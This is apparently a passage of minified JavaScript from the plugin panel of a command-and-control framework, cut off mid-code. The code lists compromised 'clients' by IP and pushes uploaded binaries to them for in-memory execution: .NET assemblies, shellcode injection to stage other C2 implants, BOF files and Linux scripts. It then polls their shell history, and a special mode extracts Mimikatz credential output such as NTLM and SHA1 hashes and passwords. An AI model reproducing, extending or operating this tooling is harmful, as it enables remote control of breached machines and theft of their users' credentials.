const __vite__mapDeps=(i,m=__vite__mapDeps,d=(m.f||(m.f=["js/ScriptManagerPanel.BY6kC-jc.js","js/index.BJ0GMplj.js","js/vue.Z7l_21JU.js","js/element.we09KMSP.js","js/utils.NIGUFBhG.js","css/index.Ct-JeeV1.css","css/ScriptManagerPanel.B3COmxmN.css"])))=>i.map(i=>d[i]);
import{s as G,b as Ge,u as Ke,C as Xe,h as Ye,_ as qe}from"./index.BJ0GMplj.js";/* empty css                     *//* empty css                        *//* empty css                 *//* empty css                  */import{y as Ze,ar as Je,a as U,e as be,d as Qe,O as et,f as M,i as o,C as V,F as we,J as i,K as ee,L as g,D as m,G as K,h as w,ac as fe,I as k,u as Z,E as tt,S as lt,ad as nt,aj as at,ak as st}from"./vue.Z7l_21JU.js";import{i as h,O as ot,r as it,t as ut,Q as rt,P as ct,V as dt,u as pt,W as vt,U as ft,d as ht,X as mt,k as gt,j as yt}from"./element.we09KMSP.js";/* empty css                                                                   */import"./utils.NIGUFBhG.js";const W={get_online_clients(){return G({url:"/client/online-clients",method:"get"})},get_plugins(){return G({url:"/plugin/list",method:"get"})},get_plugin_details(v){return G({url:`/plugin/details/${v}`,method:"get"})},upload_plugin(v){const x=new FormData;return x.append("plugin",v),G({url:"/plugin/upload",method:"post",data:x})},download_plugin(v){return G({url:`/plugin/download/${encodeURIComponent(v)}`,method:"get",responseType:"blob"})},delete_plugin(v){return G({url:`/plugin/delete/${encodeURIComponent(v)}`,method:"delete"})},get_shell_history(v){return G({url:`/client/shell/history/${v}`,method:"get"})}};function oe(v){return v?[/�/,/[À-ÿ][@-ÿ]/,/[-¿][-¿]/].some($=>$.test(v)):!1}function _t(v){if(!v)return 0;let x=0,$=0;for(const X of v){const S=X.codePointAt(0);if(!(S<32&&S!==10&&S!==13&&S!==9)){if(S<=127){$++;continue}$++,(S>=19968&&S<=40959||S>=12288&&S<=12351||S>=65280&&S<=65519)&&x++}}return $===0?0:x/$}let se=null;function xt(v){if(typeof TextDecoder>"u")return null;if(se===null)try{new TextDecoder("gb18030"),se=!0}catch{se=!1}if(!se)return null;const x=new Uint8Array(v.length);for(let $=0;$<v.length;$++){const X=v.charCodeAt($);if(X>255)return null;x[$]=X}try{const $=new TextDecoder("gb18030",{fatal:!1}).decode(x);return!$||$===v||/�/.test($)||_t($)<.05?null:$}catch{return null}}function bt(v){if(!v)return v;try{if(v.includes("%"))try{const x=decodeURIComponent(v);if(x!==v&&!oe(x))return x}catch{}if(oe(v)){const x=xt(v);if(x!==null)return x}return v}catch(x){return console.warn("编码修复失败:",x),v}}function $e(v){if(!v||!oe(v))return v;const x=bt(v);return x!==v&&!oe(x)?x:v}const Ce=v=>(at("data-v-d1407e4d"),v=v(),st(),v),wt={class:"plugin-container cs-font-ui"},$t={class:"plug-tabs"},Ct={class:"plug-toolbar"},kt={class:"plug-title-group"},Pt={class:"plug-title"},St={class:"plug-count"},Ut=Ce(()=>o("div",{class:"plug-spacer"},null,-1)),Et={class:"plugin-card"},Lt={class:"execution-mode-buttons"},Tt={class:"plugin-select-row"},It={class:"plugin-detail-strip cs-font-ui"},Mt={key:0,class:"pd-loading"},Dt={class:"pd-cell"},Ft={class:"pd-label"},At={class:"pd-value mono"},Rt={class:"pd-cell"},zt={class:"pd-label"},Bt={class:"pd-value"},Ot={class:"pd-cell"},Nt={class:"pd-label"},Vt={class:"pd-value mono"},Wt={class:"pd-cell"},jt={class:"pd-label"},Ht={class:"pd-value mono"},Gt={class:"pd-cell"},Kt={class:"pd-label"},Xt={class:"pd-value"},Yt={key:2,class:"pd-empty"},qt={class:"output-section"},Zt={class:"output-header"},Jt={class:"output-title"},Qt={class:"output-controls"},el=["disabled"],tl={key:0},ll={key:1},nl={class:"output-wrapper"},al={class:"upload-dialog-content"},sl={class:"upload-info-banner"},ol={class:"file-list-area"},il={class:"file-list-header"},ul={class:"header-col thumbnail"},rl={class:"header-col filename"},cl={class:"header-col filesize"},dl={class:"header-col status"},pl={class:"header-col operation"},vl={class:"file-list-body"},fl={key:0,class:"empty-file-list"},hl=Ce(()=>o("div",{class:"file-col thumbnail"},[o("div",{class:"file-icon"},"📄")],-1)),ml={class:"file-col filename"},gl={class:"file-col filesize"},yl={class:"file-col status"},_l={class:"file-col operation"},xl={class:"upload-dialog-footer"},bl=Ze({__name:"PluginsView",setup(v){const x=Je(()=>Ye(()=>import("./ScriptManagerPanel.BY6kC-jc.js"),__vite__mapDeps([0,1,2,3,4,5,6]))),$=Ge(),X=Ke(),S=U("plugins"),t=be(()=>X.isZh),c=U({clientUid:"",selectedPlugin:"",arguments:""}),C=U(""),R=U([]),L=U(null),ie=U(!1),b=U(""),z=U([]),B=be(()=>{if(!c.value.clientUid)return!0;const l=z.value.find(a=>a.Uid===c.value.clientUid);if(!l)return!0;const e=(l.Arch||"").toLowerCase(),n=(l.Computer||"").toLowerCase();return!e.includes("linux")&&!e.includes("darwin")&&!n.includes("linux")}),Y=U(400),q=U(800),te=U(!1),le=U();let J=U(!1),O=U(""),ue=0,re=0,ce=0,de=0;const ne=U(!1),j=U([]),he=U();Qe(async()=>{await ae(),await Ee(),document.addEventListener("mousemove",me),document.addEventListener("mouseup",ge)}),et(()=>{document.removeEventListener("mousemove",me),document.removeEventListener("mouseup",ge),P&&(clearInterval(P),P=null),N=0,A=0,D=!1});const ke=l=>{l.preventDefault(),J.value=!0,O.value="both",ue=l.clientX,re=l.clientY;const e=le.value;e&&(q.value=Math.round(e.getBoundingClientRect().width),Y.value=Math.round(e.getBoundingClientRect().height)),te.value=!0,ce=q.value,de=Y.value},Pe=l=>{l.preventDefault(),J.value=!0,O.value="width",ue=l.clientX;const e=le.value;e&&(q.value=Math.round(e.getBoundingClientRect().width)),te.value=!0,ce=q.value},Se=l=>{l.preventDefault(),J.value=!0,O.value="height",re=l.clientY;const e=le.value;e&&(Y.value=Math.round(e.getBoundingClientRect().height)),te.value=!0,de=Y.value},me=l=>{if(J.value){if(O.value==="both"||O.value==="width"){const e=l.clientX-ue;q.value=Math.max(400,ce+e)}if(O.value==="both"||O.value==="height"){const e=l.clientY-re;Y.value=Math.max(200,de+e)}}},ge=()=>{J.value=!1,O.value=""},H=l=>{C.value=l},F=()=>{switch(C.value){case"execute-assembly":return"Execute Assembly";case"inline-bin":return"Inline Bin";case"shellcode-inject":return t.value?"Shellcode注入":"Shellcode";case"script":return"Linux Script";case"binary":return"Linux Binary";case"bof":return"BOF(COFF)";case"exec-file":return"Exec File";default:return t.value?"请选择模式":"Select Mode"}},Ue=l=>{const e=l.Listener||"tcp",n=l.ID||l.id||"N/A",d=(s=>{let r="unknown",y=s.Arch||"unknown";return s.Process&&s.Process.includes(".exe")?r="windows":s.Computer&&s.Computer.toLowerCase().includes("linux")?r="linux":s.Computer&&s.Computer.toLowerCase().includes("darwin")?r="darwin":r="windows",`${r}_${y}`})(l);return t.value?`ID：${n} | ${e.toUpperCase()} | ${l.ExternalIP} | ${d} | ${l.Computer}`:`ID: ${n} | ${e.toUpperCase()} | ${l.ExternalIP} | ${d} | ${l.Computer}`},Ee=async()=>{var l,e;try{const n=await W.get_online_clients();if(n.data&&n.data.status===200&&Array.isArray(n.data.data)){const s=n.data.data.filter(r=>(r.online??r.Online)==="1"||String(r.online??r.Online)==="1").map(r=>({Uid:r.uid||r.Uid||"",Computer:r.computer||r.Computer||"unknown",ExternalIP:r.external_ip||r.ExternalIP||"-",Username:r.username||r.Username||"user",Listener:r.listener||r.Listener||"tcp",Online:"1"}));if(s.length){z.value=s,s.length;return}}const d=((e=(l=(await Xe.get_clients_list({page:1,page_size:1e3})).data)==null?void 0:l.data)==null?void 0:e.list)||[];z.value=d.filter(s=>s.Online==="1"||String(s.Online)==="1"),z.value.length||console.warn("在线客户端为空")}catch(n){console.error("获取在线客户端失败:",n),h.error(t.value?"获取客户端列表失败":"Failed to load client list")}},ae=async()=>{try{const l=await W.get_plugins();l.data&&l.data.status===200?(R.value=l.data.data||[],R.value.length,R.value.length>0&&R.value.map(e=>e.Name)):(console.error("❌ 插件API返回异常:",l.data),R.value=[],h.error(t.value?"插件列表加载失败":"Failed to load plugin list"))}catch(l){console.error("❌ 刷新插件列表失败:",l),R.value=[],h.error(t.value?"刷新插件列表失败":"Failed to refresh plugin list")}},Le=async()=>{var e;L.value=null;const l=c.value.selectedPlugin;if(l){ie.value=!0;try{const n=await W.get_plugin_details(l);n.data&&n.data.status===200?L.value=n.data.data||null:(L.value=null,h.error(((e=n.data)==null?void 0:e.message)||(t.value?"获取插件详情失败":"Failed to load plugin details")))}catch{L.value=null,h.error(t.value?"获取插件详情失败":"Failed to load plugin details")}finally{ie.value=!1}}},Te=async()=>{const l=c.value.selectedPlugin;if(l)try{const e=await W.download_plugin(l),n=e.data instanceof Blob?e.data:new Blob([e.data],{type:"application/octet-stream"}),a=document.createElement("a"),d=URL.createObjectURL(n);a.href=d,a.download=l,a.click(),URL.revokeObjectURL(d),h.success(t.value?`插件 ${l} 已下载`:`Plugin ${l} downloaded`)}catch(e){h.error((e==null?void 0:e.message)||(t.value?"下载插件失败":"Failed to download plugin"))}},Ie=()=>{const l=c.value.selectedPlugin;l&&yt.confirm(t.value?`确定要删除插件 "${l}" 吗？此操作不可恢复。`:`Delete plugin "${l}"? This cannot be undone.`,t.value?"删除插件确认":"Delete Plugin",{confirmButtonText:t.value?"确定":"Confirm",cancelButtonText:t.value?"取消":"Cancel",type:"error"}).then(async()=>{var e,n,a,d;try{const s=await W.delete_plugin(l);s.data&&s.data.status===200?(h.success(t.value?"插件已删除":"Plugin deleted"),c.value.selectedPlugin="",L.value=null,await ae()):h.error(((e=s.data)==null?void 0:e.data)||((n=s.data)==null?void 0:n.message)||(t.value?"删除插件失败":"Failed to delete plugin"))}catch(s){h.error(((d=(a=s.response)==null?void 0:a.data)==null?void 0:d.data)||(t.value?"删除插件失败":"Failed to delete plugin"))}})},Me=()=>{P&&(clearInterval(P),P=null,N=0,A=0,D=!1,b.value+=t.value?`

[⏹️] 用户手动停止轮询
提示：您可以稍后手动查看Shell历史记录来确认执行结果`:`

[⏹️] Polling stopped by user
Tip: check the shell history later to confirm the result`,h.info(t.value?"已停止轮询获取执行结果":"Stopped polling for results"))},De=()=>{b.value="",h.success(t.value?"输出已清空":"Output cleared")},Fe=async()=>{if(!b.value){h.warning(t.value?"没有内容可复制":"Nothing to copy");return}try{await navigator.clipboard.writeText(b.value),h.success(t.value?"已复制全部输出内容":"Copied all output")}catch{const e=document.createElement("textarea");e.value=b.value,document.body.appendChild(e),e.select(),document.execCommand("copy"),document.body.removeChild(e),h.success(t.value?"已复制全部输出内容":"Copied all output")}},Ae=()=>{if(!b.value){h.warning(t.value?"没有内容可导出":"Nothing to export");return}const l=new Date().toISOString().replace(/[:.]/g,"-"),n=`plugin-output-${c.value.selectedPlugin||"unknown"}-${l}.txt`,a=new Blob([b.value],{type:"text/plain;charset=utf-8"}),d=URL.createObjectURL(a),s=document.createElement("a");s.href=d,s.download=n,document.body.appendChild(s),s.click(),document.body.removeChild(s),URL.revokeObjectURL(d),h.success(t.value?"日志已导出":"Log exported")},Re=async()=>{if(!c.value.clientUid){h.warning(t.value?"请先选择客户端":"Select a client first");return}try{const l=await W.get_shell_history(c.value.clientUid);if(l.data&&l.data.status===200){const e=$e(l.data.data||"");e.length,e.split(`
`).length,e.toLowerCase().includes("mimikatz"),e.includes("Authentication Id"),e.includes("=== CAPTURED OUTPUT ==="),e.includes("=== FINAL OUTPUT DUMP ===");const n=c.value.selectedPlugin.toLowerCase().includes("mimikatz")||c.value.selectedPlugin.toLowerCase().includes("sekur")||c.value.selectedPlugin.toLowerCase().includes("creds");let a=e;C.value&&c.value.selectedPlugin&&(n?a=_e(e,C.value,c.value.selectedPlugin):a=ye(e,C.value,c.value.selectedPlugin));const d=f=>f?t.value?"是":"yes":t.value?"否":"no",s=n?t.value?"Mimikatz专用模式（宽松过滤）":"Mimikatz mode (loose filter)":t.value?"标准过滤模式":"Standard filter",r=C.value?t.value?`显示模式: ${s}`:`Display mode: ${s}`:"",y=e.includes("Authentication Id"),E=e.includes("=== CAPTURED OUTPUT ===")||e.includes("=== FINAL OUTPUT DUMP ===");b.value=t.value?`[🔄] 手动刷新Shell历史
时间: ${new Date().toLocaleString()}
客户端: ${c.value.clientUid}
${r}

=== 调试信息 ===
原始内容长度: ${e.length} 字符
过滤后长度: ${a.length} 字符
包含 mimikatz 关键字: ${d(e.toLowerCase().includes("mimikatz"))}
包含凭据信息: ${d(y)}
包含输出标记: ${d(E)}

=== 最新执行结果 ===
${a}

=== 调试提示 ===
如果上面的结果不完整，请检查：
1. 客户端日志是否显示完整输出
2. 是否选择了正确的执行模式
3. 插件名称是否匹配`:`[🔄] Shell History Refreshed
Time: ${new Date().toLocaleString()}
Client: ${c.value.clientUid}
${r}

=== Debug Info ===
Raw length: ${e.length} chars
Filtered length: ${a.length} chars
Contains mimikatz keyword: ${d(e.toLowerCase().includes("mimikatz"))}
Contains credential info: ${d(y)}
Contains output markers: ${d(E)}

=== Latest Execution Result ===
${a}

=== Debug Tips ===
If the result above is incomplete, check:
1. Whether the client log shows the complete output
2. Whether the correct execution mode is selected
3. Whether the plugin name matches`,h.success(t.value?"已更新Shell历史内容（包含调试信息）":"Shell history updated (with debug info)")}else h.error(t.value?"获取Shell历史失败":"Failed to load shell history")}catch(l){console.error("刷新Shell内容失败:",l),h.error(t.value?"刷新失败："+(l instanceof Error?l.message:"网络错误"):"Refresh failed: "+(l instanceof Error?l.message:"network error"))}},ze=async()=>{if(!c.value.clientUid||!c.value.selectedPlugin||!C.value){h.warning(t.value?"请选择客户端、插件和执行模式":"Select a client, plugin and execution mode");return}const l=z.value.find(e=>e.Uid===c.value.clientUid);if(!l||l.Online!=="1"){h.error(t.value?"所选客户端不在线，请选择其他客户端":"Selected client is offline, pick another one");return}try{const e=c.value.selectedPlugin,n=c.value.clientUid,a=c.value.arguments||"",d=a||(t.value?"无":"none");b.value=t.value?`[🔄] 开始执行插件
===================
模式: ${F()}
插件: ${e}
参数: ${d}
客户端: ${l.Computer} (${l.ExternalIP})
执行时间: ${new Date().toLocaleTimeString()}
显示模式: 仅显示最新一次 ${C.value} 执行结果
===================

正在下载插件文件...`:`[🔄] Plugin Execution Started
===================
Mode: ${F()}
Plugin: ${e}
Arguments: ${d}
Client: ${l.Computer} (${l.ExternalIP})
Started at: ${new Date().toLocaleTimeString()}
Display mode: latest ${C.value} run only
===================

Downloading plugin file...`;const s=`/api/plugin/download/${e}`;b.value+=t.value?`
正在准备执行文件...`:`
Preparing execution file...`;const r=await fetch(s,{headers:{Authorization2:"Bearer "+$.getToken()}});if(!r.ok)throw new Error(t.value?`无法下载插件文件: HTTP ${r.status}`:`Failed to download plugin file: HTTP ${r.status}`);const y=await r.blob(),E=new File([y],e);b.value+=t.value?`
正在发送命令到客户端...`:`
Sending command to client...`;const f=new FormData;f.append("file",E),f.append("uid",n),f.append("mode",C.value),f.append("args",a);const T=await(await fetch("/api/bin/execute",{method:"POST",headers:{Authorization2:"Bearer "+$.getToken()},body:f})).json();if(T.status===200)b.value+=t.value?`
命令已成功发送到客户端

正在等待执行结果...`:`
Command sent to client

Waiting for results...`,h.success(t.value?"插件命令已发送，正在等待执行结果":"Command sent, waiting for results"),N=0,Be(n,e);else{const u=T.data||T.message||(t.value?"未知错误":"Unknown error");b.value=t.value?`[✗] 执行失败
错误原因: ${u}

请检查：
1. 客户端是否正常连接
2. 插件文件格式是否正确
3. 执行模式是否与插件类型匹配`:`[✗] Execution Failed
Reason: ${u}

Check:
1. Whether the client is connected
2. Whether the plugin file format is correct
3. Whether the execution mode matches the plugin type`,h.error((t.value?"插件执行失败: ":"Plugin execution failed: ")+u)}}catch(e){let n=t.value?"未知错误":"Unknown error";e instanceof Error?n=e.message:typeof e=="string"&&(n=e),b.value=t.value?`[✗] 执行失败
错误信息: ${n}

常见问题解决：
1. 检查网络连接是否正常
2. 确认身份验证未过期
3. 刷新页面后重试
4. 联系管理员获取帮助`:`[✗] Execution Failed
Error: ${n}

Common fixes:
1. Check the network connection
2. Make sure the session has not expired
3. Refresh the page and retry
4. Contact an administrator`,h.error((t.value?"执行插件时发生错误: ":"Plugin execution error: ")+n),console.error("执行插件时发生错误:",e)}},ye=(l,e,n)=>{if(!l||!e)return l;const a=l.split(`
`),d=["execute-assembly","inline-bin","shellcode-inject","script","binary","bof","exec-file"];let s=-1;for(let f=a.length-1;f>=0;f--){const p=a[f];if(p.startsWith("$ ")&&p.includes(e)&&p.includes(n)){s=f;break}}if(s===-1)return t.value?`暂无当前执行模式的相关输出。

请执行插件后查看结果。`:`No output for the current execution mode.

Run a plugin and check the result.`;let r=a.length;for(let f=s+1;f<a.length;f++){const p=a[f];if(p.startsWith("$ ")&&d.some(T=>p.includes(T))){r=f;break}}const y=a.slice(s,r);let E=y.join(`
`);if(E.length<500&&n.toLowerCase().includes("mimikatz")){let f=Math.max(0,s-50),p=a.slice(f,r);const T=["Authentication Id","Session","Username","Domain","NTLM","SHA1","Password","Kerberos","Primary","msv","tspkg","wdigest","kerberos","ssp","credman","=== CAPTURED OUTPUT ===","=== FINAL OUTPUT DUMP ==="];for(let u of p)if(T.some(_=>u.toLowerCase().includes(_.toLowerCase()))){E=p.join(`
`);break}}return a.length,y.length,E.length,E},_e=(l,e,n)=>{if(!l||!e)return l;const a=l.split(`
`),d=["execute-assembly","inline-bin","shellcode-inject","script","binary","bof","exec-file"];let s=-1;for(let f=a.length-1;f>=0;f--){const p=a[f];if(p.startsWith("$ ")&&p.includes(e)&&p.includes(n)){s=f;break}}if(s===-1)for(let f=a.length-1;f>=0;f--){const p=a[f];if(p.startsWith("$ ")&&(p.toLowerCase().includes("mimikatz")||p.toLowerCase().includes("sekur")||p.includes(n))){s=f;break}}if(s===-1){const p=a.slice(Math.max(0,a.length-200)).join(`
`);return["Authentication Id","Session","Username","Domain","NTLM","SHA1","mimikatz","=== CAPTURED OUTPUT ==="].some(u=>p.toLowerCase().includes(u.toLowerCase()))?p:t.value?`暂无执行相关输出，请检查执行是否成功。

如果问题持续，请查看完整Shell历史。`:`No execution output found, check whether the run succeeded.

If the problem persists, review the full shell history.`}let r=a.length;for(let f=s+1;f<a.length;f++){const p=a[f];if(p.startsWith("$ ")&&!p.includes("[CLIENT-PACKET]")&&!p.includes("完整数据包")&&d.some(T=>p.includes(T))&&!p.includes(n)){r=f;break}}let y=Math.max(0,s-20);const E=a.slice(y,r);return a.length,E.length,E.join(`
`)};let P=null,N=0,pe=0,A=0,D=!1;const Be=(l,e)=>{P&&clearInterval(P);let n=0;const a=30;pe=Date.now(),A=0,D=!1;const d=e.toLowerCase().includes("mimikatz")||e.toLowerCase().includes("sekur")||e.toLowerCase().includes("creds"),s=1e3;let r=!1;P=setInterval(async()=>{if(n++,!r){r=!0;try{const y=await W.get_shell_history(l);if(y.data&&y.data.status===200){const E=y.data.data||"",f=$e(E);let p;d?p=_e(f,C.value,e):p=ye(f,C.value,e);const T=["[+] Assembly execution completed successfully","Assembly loaded, methodInfo:","Stdout length:","Assembly execution completed","Assembly executed successfully","[Windows内存执行]","=== FINAL OUTPUT DUMP ===","=== CAPTURED OUTPUT ===","[+] Execution completed successfully","InlineBin execution completed","Linux script executed","Linux binary executed","script error:","binary error:","BOF executed","BOF entry point","file executed","file exec error","Authentication Id","NTLM","SHA1"];if(p.length!==N){if(A=0,N=p.length,T.some(_=>p.toLowerCase().includes(_.toLowerCase()))&&!D&&(D=!0),p.trim().length>0){const _=D?t.value?"收集输出中":"collecting output":t.value?"正在执行":"running";b.value=t.value?`[⏳] 插件${_}...
模式: ${F()}
插件: ${e}
参数: ${c.value.arguments||"无"}
尝试次数: ${n}/${a}
显示模式: ${d?"完整输出模式（mimikatz优化）":"过滤输出模式"}

=== 实时执行结果 ===
${p}

${_}中...`:`[⏳] Plugin ${_}...
Mode: ${F()}
Plugin: ${e}
Arguments: ${c.value.arguments||"none"}
Attempt: ${n}/${a}
Display mode: ${d?"full output (mimikatz tuned)":"filtered output"}

=== Live Execution Result ===
${p}

${_}...`}}else if(A++,`${A}${D}`,D&&A>=(d?2:3)&&p.trim().length>10){const _=Math.round((Date.now()-pe)/1e3),I=z.value.find(ve=>ve.Uid===l),Q=I&&(I.ID||I.id)||"N/A";b.value=t.value?`[✓] 插件执行完成
模式: ${F()}
插件: ${e}
参数: ${c.value.arguments||"无"}
客户端: ${Q}
执行时间: ${_}秒
显示模式: ${d?"完整输出模式（mimikatz优化）":"过滤输出模式"}

=== 最终执行结果 ===
${p}`:`[✓] Plugin Execution Finished
Mode: ${F()}
Plugin: ${e}
Arguments: ${c.value.arguments||"none"}
Client: ${Q}
Elapsed: ${_}s
Display mode: ${d?"full output (mimikatz tuned)":"filtered output"}

=== Final Execution Result ===
${p}`,clearInterval(P),P=null,N=0,A=0,D=!1,h.success(t.value?"插件执行完成，完整结果已显示":"Plugin finished, full results shown");return}if(n>=a){const u=p||"";if(D&&u.trim().length>10){const _=Math.round((Date.now()-pe)/1e3),I=z.value.find(ve=>ve.Uid===l),Q=I&&(I.ID||I.id)||"N/A";b.value=t.value?`[✓] 插件执行完成（超时显示）
模式: ${F()}
插件: ${e}
参数: ${c.value.arguments||"无"}
客户端: ${Q}
执行时间: ${_}秒
显示模式: ${d?"完整输出模式（mimikatz优化）":"过滤输出模式"}

=== 最终执行结果 ===
${u}

提示：由于达到${a}秒超时限制，系统强制显示结果。`:`[✓] Plugin Execution Finished (shown on timeout)
Mode: ${F()}
Plugin: ${e}
Arguments: ${c.value.arguments||"none"}
Client: ${Q}
Elapsed: ${_}s
Display mode: ${d?"full output (mimikatz tuned)":"filtered output"}

=== Final Execution Result ===
${u}

Note: the ${a}s timeout was reached, so the result is shown as-is.`,h.success(t.value?"插件执行结果已显示（超时显示）":"Results shown (timeout)")}else{const _=f.split(`
`).slice(-30).join(`
`);b.value+=t.value?`

[⚠️] 轮询超时 (${a}秒)

原始Shell输出（最近30行）：
${_}

过滤后内容长度：${u.length}

可能原因：
1. 插件执行时间较长
2. 输出内容被过度过滤
3. 客户端网络延迟

建议：请检查客户端Shell历史记录或联系技术支持`:`

[⚠️] Polling Timeout (${a}s)

Raw shell output (last 30 lines):
${_}

Filtered content length: ${u.length}

Possible causes:
1. The plugin takes a long time to run
2. The output was over-filtered
3. Client network latency

Suggestion: check the client shell history or contact support`,h.warning(t.value?"轮询超时，请检查Shell历史记录":"Polling timed out, check shell history")}clearInterval(P),P=null,N=0,A=0,D=!1}else if(p.trim().length===0||n<=3&&!D){const u=".".repeat(n%4+1),_=b.value.split(`
`);let I=_.length-1;for(;I>=0&&_[I].includes(t.value?"正在等待执行结果":"Waiting for results");)_.splice(I,1),I--;_.push(t.value?`正在等待执行结果${u} (${n}/${a}) - 已等待${n}秒`:`Waiting for results${u} (${n}/${a}) - ${n}s elapsed`),b.value=_.join(`
`)}}}catch(y){console.error("获取Shell历史失败:",y),n>=a&&(b.value+=t.value?`

[✗] 获取执行结果失败
错误信息: ${y instanceof Error?y.message:String(y)}
请检查网络连接和客户端状态`:`

[✗] Failed to Fetch Execution Result
Error: ${y instanceof Error?y.message:String(y)}
Check the network connection and client state`,clearInterval(P),P=null,N=0,h.error(t.value?"获取执行结果失败":"Failed to get execution results"))}finally{r=!1}}},s)},Oe=l=>{const e=["application/x-msdownload","application/x-executable","application/x-sharedlib","application/x-so","application/x-python","text/x-python","application/octet-stream"],n=[".exe",".net",".elf",".dll",".so",".dylib"],a=l.name.toLowerCase(),d=n.some(s=>a.endsWith(s));return!e.includes(l.type)&&!d?(h.warning(t.value?"只能上传插件文件(如exe/net/elf/dll/so/dylib)":"Only plugin files allowed (exe/net/elf/dll/so/dylib)"),!1):l.size>50*1024*1024?(h.warning(t.value?"文件大小不能超过50MB":"File size cannot exceed 50MB"),!1):!0},Ne=async()=>{var l,e;if(j.value.length===0){h.warning(t.value?"请选择要上传的文件":"Select files to upload");return}try{for(const n of j.value){const a=await W.upload_plugin(n);((l=a.data)==null?void 0:l.status)===200?h.success(t.value?`${n.name} 上传成功`:`${n.name} uploaded`):h.error(((e=a.data)==null?void 0:e.message)||(t.value?`${n.name} 上传失败`:`${n.name} upload failed`))}ae()}catch{h.error(t.value?"上传过程中发生错误":"Upload failed")}},Ve=l=>{const e=l.target;if(e.files){const n=Array.from(e.files);for(const a of n)Oe(a)&&j.value.push(a)}e.value=""},We=l=>{j.value.splice(l,1)},xe=l=>{if(l===0)return"0 B";const e=1024,n=["B","KB","MB","GB"],a=Math.floor(Math.log(l)/Math.log(e));return parseFloat((l/Math.pow(e,a)).toFixed(2))+" "+n[a]},je=()=>{var l;(l=he.value)==null||l.click()},He=()=>{ne.value=!1,j.value=[]};return(l,e)=>{const n=ut,a=it,d=ot,s=rt,r=ct,y=pt,E=vt,f=ft,p=ht,T=gt;return w(),M("div",wt,[o("div",$t,[o("div",{class:we(["plug-tab",{active:S.value==="plugins"}]),onClick:e[0]||(e[0]=u=>S.value="plugins")},i(t.value?"插件运行":"Plugins"),3),o("div",{class:we(["plug-tab",{active:S.value==="scripts"}]),onClick:e[1]||(e[1]=u=>S.value="scripts")},i(t.value?"脚本 (CNA)":"Scripts (CNA)"),3)]),S.value==="plugins"?(w(),M(ee,{key:0},[o("div",Ct,[o("div",kt,[o("span",Pt,i(t.value?"内存执行与插件模块":"Memory Execution & Plugins"),1),o("span",St,"("+i(R.value.length)+" "+i(t.value?"个插件可用":"plugins available")+")",1)]),Ut,o("button",{class:"cs-btn cs-btn-primary",onClick:e[2]||(e[2]=u=>ne.value=!0)},i(t.value?"上传插件":"Upload Plugin"),1),o("button",{class:"cs-btn",onClick:ae},i(t.value?"刷新":"Refresh"),1)]),o("div",Et,[g(f,{model:c.value,"label-width":"120px",class:"plugin-form"},{default:m(()=>[g(d,{label:t.value?"选择客户端":"Select Client",required:""},{default:m(()=>[g(a,{modelValue:c.value.clientUid,"onUpdate:modelValue":e[3]||(e[3]=u=>c.value.clientUid=u),placeholder:t.value?"请选择已上线的客户端":"Select an online client",class:"full-width"},{default:m(()=>[(w(!0),M(ee,null,fe(z.value,u=>(w(),V(n,{key:u.Uid,label:Ue(u),value:u.Uid},null,8,["label","value"]))),128))]),_:1},8,["modelValue","placeholder"])]),_:1},8,["label"]),g(d,{label:t.value?"执行模式":"Execution Mode"},{default:m(()=>[o("div",Lt,[g(s,{type:C.value==="execute-assembly"?"primary":"default",onClick:e[4]||(e[4]=u=>H("execute-assembly")),disabled:!B.value,class:"mode-button"},{default:m(()=>[k(i(t.value?"Execute Assembly(.NET程序内存执行)":"Execute Assembly (.NET in-memory)"),1)]),_:1},8,["type","disabled"]),g(s,{type:C.value==="inline-bin"?"primary":"default",onClick:e[5]||(e[5]=u=>H("inline-bin")),disabled:!B.value,class:"mode-button"},{default:m(()=>[k(i(t.value?"Inline Bin(其他exe程序内存执行)":"Inline Bin (other exe in-memory)"),1)]),_:1},8,["type","disabled"]),g(s,{type:C.value==="shellcode-inject"?"primary":"default",onClick:e[6]||(e[6]=u=>H("shellcode-inject")),disabled:!B.value,class:"mode-button"},{default:m(()=>[k(i(t.value?"shellcode执行(执行shellcode,上线其他C2等)":"Shellcode (run shellcode, stage other C2)"),1)]),_:1},8,["type","disabled"]),g(s,{type:C.value==="script"?"primary":"default",onClick:e[7]||(e[7]=u=>H("script")),disabled:B.value,class:"mode-button"},{default:m(()=>[k(i(t.value?"Script(Linux脚本内存执行)":"Script (Linux script in-memory)"),1)]),_:1},8,["type","disabled"]),g(s,{type:C.value==="binary"?"primary":"default",onClick:e[8]||(e[8]=u=>H("binary")),disabled:B.value,class:"mode-button"},{default:m(()=>[k(i(t.value?"Binary(Linux二进制执行)":"Binary (Linux binary exec)"),1)]),_:1},8,["type","disabled"]),g(s,{type:C.value==="bof"?"primary":"default",onClick:e[9]||(e[9]=u=>H("bof")),disabled:!B.value,class:"mode-button"},{default:m(()=>[k(i(t.value?"BOF(COFF内存执行)":"BOF (COFF in-memory)"),1)]),_:1},8,["type","disabled"]),g(s,{type:C.value==="exec-file"?"primary":"default",onClick:e[10]||(e[10]=u=>H("exec-file")),class:"mode-button"},{default:m(()=>[k(i(t.value?"Exec File(临时文件执行,支持Go/Rust PE)":"Exec File (temp file exec, Go/Rust PE)"),1)]),_:1},8,["type"])]),!B.value&&c.value.clientUid?(w(),V(r,{key:0,type:"info",closable:!1,"show-icon":"",style:{"margin-top":"8px"}},{default:m(()=>[k(i(t.value?"Linux 客户端：使用 Script 或 Binary 模式执行插件":"Linux client: use Script or Binary mode"),1)]),_:1})):K("",!0),B.value&&c.value.clientUid?(w(),V(r,{key:1,type:"warning",closable:!1,"show-icon":"",style:{"margin-top":"8px"}},{default:m(()=>[k(i(t.value?"Windows 客户端：使用 Execute Assembly / Inline Bin / Shellcode / BOF 模式":"Windows client: use Execute Assembly / Inline Bin / Shellcode / BOF"),1)]),_:1})):K("",!0),c.value.clientUid?K("",!0):(w(),V(r,{key:2,type:"info",closable:!1,"show-icon":"",style:{"margin-top":"8px"}},{default:m(()=>[k(i(t.value?"请先选择客户端":"Select a client first"),1)]),_:1}))]),_:1},8,["label"]),g(d,{label:t.value?"选择插件":"Select Plugin",required:""},{default:m(()=>[o("div",Tt,[g(a,{modelValue:c.value.selectedPlugin,"onUpdate:modelValue":e[11]||(e[11]=u=>c.value.selectedPlugin=u),placeholder:t.value?"请选择插件":"Select a 